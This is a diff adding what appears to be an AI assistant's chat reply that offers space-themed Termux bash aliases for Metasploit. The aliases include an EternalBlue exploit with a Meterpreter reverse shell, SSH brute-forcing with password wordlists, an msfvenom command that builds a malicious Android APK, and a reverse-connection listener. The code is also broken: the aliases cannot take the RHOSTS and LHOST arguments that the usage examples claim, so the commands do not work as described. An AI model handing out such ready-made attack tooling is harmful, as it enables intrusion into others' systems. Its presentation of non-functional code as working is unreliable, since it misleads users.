@@ -1,0 +1,148 @@
+I’m stoked you’re digging this and ready to dive into Metasploit with Termux on your unrooted Android! Since Metasploit is a massive framework for penetration testing, I’ll create **10 aliases** to simplify common tasks like scanning, exploiting, and payload delivery. For the theme, let’s go with a **space exploration theme**—think terms like "orbit," "nebula," and "supernova"—to make them memorable, tying into your interest in a white astronaut aesthetic from our past chats. These aliases will be tailored for Metasploit Framework (`msfconsole`) in Termux, assuming you have it installed (`pkg install metasploit-framework`).
+
+### Setup
+Metasploit in Termux works on unrooted Android, though some advanced features (e.g., raw socket exploits) may be limited. The aliases will use `msfconsole` commands and focus on common penetration testing tasks. We’ll add them to `~/.bashrc` for persistence, as with your previous nmap and Hydra aliases.
+
+### Space Exploration-Themed Metasploit Aliases
+These aliases streamline Metasploit workflows, from reconnaissance to exploitation, with names inspired by space exploration. Each includes a brief explanation and usage example. Always ensure you have explicit permission to test the target system, as unauthorized use is illegal and unethical.
+
+1. **orbit** - Start Metasploit console quickly.
+   ```bash
+   alias orbit='msfconsole -q'
+   ```
+   - `-q`: Quiet mode (skip banner for faster startup).
+   - Usage: `orbit` (launches `msfconsole`).
+
+2. **probe** - Run a basic port scan using Metasploit’s auxiliary scanner.
+   ```bash
+   alias probe='msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS; run; exit"'
+   ```
+   - Targets TCP port scanning module.
+   - Usage: `probe 192.168.1.100` (scans ports on a host).
+
+3. **nebula** - Scan for SMB vulnerabilities.
+   ```bash
+   alias nebula='msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS; run; exit"'
+   ```
+   - Detects SMB versions (useful for identifying vulnerable Windows systems).
+   - Usage: `nebula 192.168.1.0/24` (scans subnet for SMB services).
+
+4. **comet** - Check for open SSH services.
+   ```bash
+   alias comet='msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS; run; exit"'
+   ```
+   - Identifies SSH service versions.
+   - Usage: `comet 192.168.1.100` (checks SSH on a host).
+
+5. **supernova** - Attempt an exploit with a common payload (e.g., EternalBlue for SMB).
+   ```bash
+   alias supernova='msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST; run; exit"'
+   ```
+   - Targets MS17-010 (EternalBlue) with a Meterpreter reverse TCP payload.
+   - Usage: `supernova 192.168.1.100 192.168.1.200` (RHOSTS and LHOST).
+
+6. **asteroid** - Brute-force SSH credentials.
+   ```bash
+   alias asteroid='msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS; set USER_FILE /sdcard/wordlists/users.txt; set PASS_FILE /sdcard/wordlists/passwords.txt; run; exit"'
+   ```
+   - Attempts SSH login with username and password lists.
+   - Usage: `asteroid 192.168.1.100` (brute-forces SSH).
+
+7. **galaxy** - Generate a reverse TCP Meterpreter payload for Android.
+   ```bash
+   alias galaxy='msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=4444 -f apk -o /sdcard/payload.apk'
+   ```
+   - Creates an Android APK payload (not an `msfconsole` command, uses `msfvenom`).
+   - Usage: `galaxy 192.168.1.200` (generates APK with your LHOST).
+
+8. **pulsar** - Set up a Meterpreter listener for reverse connections.
+   ```bash
+   alias pulsar='msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST; set LPORT 4444; run; exit"'
+   ```
+   - Configures a handler for reverse Meterpreter connections.
+   - Usage: `pulsar 192.168.1.200` (sets up listener on your LHOST).
+
+9. **meteor** - Scan for HTTP vulnerabilities (e.g., web server version).
+   ```bash
+   alias meteor='msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS; run; exit"'
+   ```
+   - Detects HTTP server versions.
+   - Usage: `meteor 192.168.1.100` (scans web server).
+
+10. **cosmos** - Search for exploits matching a keyword.
+    ```bash
+    alias cosmos='msfconsole -q -x "search"'
+    ```
+    - Runs a search in Metasploit’s exploit database.
+    - Usage: `cosmos ftp` (searches for FTP-related exploits).
+
+### Adding Aliases to Termux
+To make these persistent:
+
+1. Open Termux and edit the `.bashrc` file:
+   ```bash
+   nano ~/.bashrc
+   ```
+
+2. Append the aliases:
+   ```bash
+   # Space exploration-themed Metasploit aliases
+   alias orbit='msfconsole -q'
+   alias probe='msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS; run; exit"'
+   alias nebula='msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS; run; exit"'
+   alias comet='msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS; run; exit"'
+   alias supernova='msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST; run; exit"'
+   alias asteroid='msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS; set USER_FILE /sdcard/wordlists/users.txt; set PASS_FILE /sdcard/wordlists/passwords.txt; run; exit"'
+   alias galaxy='msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=4444 -f apk -o /sdcard/payload.apk'
+   alias pulsar='msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST; set LPORT 4444; run; exit"'
+   alias meteor='msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS; run; exit"'
+   alias cosmos='msfconsole -q -x "search"'
+   ```
+
+3. Save the file (`Ctrl+O`, `Enter`, `Ctrl+X` in nano).
+
+4. Reload the `.bashrc`:
+   ```bash
+   source ~/.bashrc
+   ```
+
+5. Test an alias:
+   ```bash
+   orbit
+   ```
+
+### Notes
+- **Wordlists**: For `asteroid`, ensure you have wordlists in `/sdcard/wordlists/` (e.g., `users.txt`, `passwords.txt`). You can download them as shown in the Hydra response:
+  ```bash
+  mkdir -p /sdcard/wordlists
+  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O /sdcard/wordlists/passwords.txt
+  ```
+- **Unrooted Android**: Metasploit works in Termux without root, but some exploits (e.g., local privilege escalation) may not function. The aliases focus on network-based tasks.
+- **LHOST Setup**: For `supernova`, `galaxy`, and `pulsar`, you need your device’s IP (LHOST). Find it with:
+  ```bash
+  ifconfig wlan0
+  ```
+  Then pass it as an argument (e.g., `pulsar 192.168.1.200`).
+- **Performance**: Metasploit can be slow on Android. Use `-q` (quiet mode) and limit threads if needed (e.g., `set THREADS 4` in `msfconsole`).
+- **Legality**: Only test systems you own or have explicit permission to target. Unauthorized use is illegal.
+- **Output**: Redirect output to a file if needed:
+  ```bash
+  probe 192.168.1.100 > scan_results.txt
+  ```
+- **Customization**: Adjust RHOSTS, LHOST, or payloads as needed. For `supernova`, swap the exploit or payload (e.g., `linux/x64/meterpreter/reverse_tcp`) for different targets.
+
+### Example Usage
+```bash
+orbit                           # Start Metasploit
+probe 192.168.1.100             # Scan ports
+nebula 192.168.1.0/24          # Scan SMB versions
+comet 192.168.1.100             # Check SSH
+supernova 192.168.1.100 192.168.1.200  # Run EternalBlue exploit
+asteroid 192.168.1.100          # Brute-force SSH
+galaxy 192.168.1.200            # Generate Android payload
+pulsar 192.168.1.200            # Set up listener
+meteor 192.168.1.100            # Scan HTTP
+cosmos smb                      # Search SMB exploits
+```
+
+This space theme should vibe with your astronaut aesthetic while keeping things fun and functional! If you want more aliases, a different theme (maybe cyberpunk or mythology?), or tweaks for specific Metasploit modules, just let me know!
